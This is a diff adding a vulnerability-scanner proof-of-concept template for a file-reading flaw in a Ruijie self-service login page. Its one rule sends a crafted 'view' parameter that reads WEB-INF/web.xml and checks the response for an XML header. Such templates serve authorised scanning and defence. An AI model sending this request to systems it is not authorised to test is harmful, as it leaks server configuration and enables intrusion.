@@ -1,0 +1,17 @@
+name: poc-yaml-ruijie-judge-jsf-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F
+    expression: response.status == 200 && response.body.bcontains(b'<?xml version="1.0" encoding="UTF-8"?>')
+expression: r0()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139510684
